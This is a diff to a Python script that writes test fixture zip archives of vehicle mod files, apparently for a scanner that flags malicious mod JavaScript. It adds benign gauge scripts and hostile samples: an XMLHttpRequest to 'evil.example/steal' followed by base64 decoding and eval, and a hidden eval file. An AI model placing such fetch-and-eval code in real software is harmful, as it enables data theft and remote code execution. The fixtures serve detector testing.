@@ -78,6 +78,15 @@ def main() -> None:
                 "angular.module('gaugesScreen2', [])\n"
                 ".directive('dash', function () { return {}; });\n"
             ),
+            "vehicles/car/ScreenGaugeAMG/gauges_screen_AMG.js": (
+                "angular.module('amg', [])\n"
+                ".directive('dash', function () { return {}; });\n"
+            ),
+            "vehicles/car/gauges_screen_MERS/gauges_screen.js": (
+                "['DatePage', 'InfoPage'].forEach((page) => {\n"
+                "  eval(page).root.n.style.display = 'inline';\n"
+                "});\n"
+            ),
             "vehicles/car/lua/controller/demo.lua": (
                 "-- This Source Code Form is subject to the terms of the bCDDL, v. 1.1.\n"
                 "-- If a copy of the bCDDL was not distributed with this\n"
@@ -98,6 +107,17 @@ def main() -> None:
                 "var x = new XMLHttpRequest();\n"
                 "x.open('GET', 'https://evil.example/steal');\n"
                 "var code = atob('SGVsbG8=');\n"
+                "eval(code);\n"
+            ),
+        },
+    )
+
+    _write_zip(
+        FIX / "gauge_hidden_eval.zip",
+        {
+            "vehicles/car/ScreenGaugeAMG/evil.js": (
+                "eval(page).ok = true;\n"
+                "eval('alert(1)');\n"
             ),
         },
     )
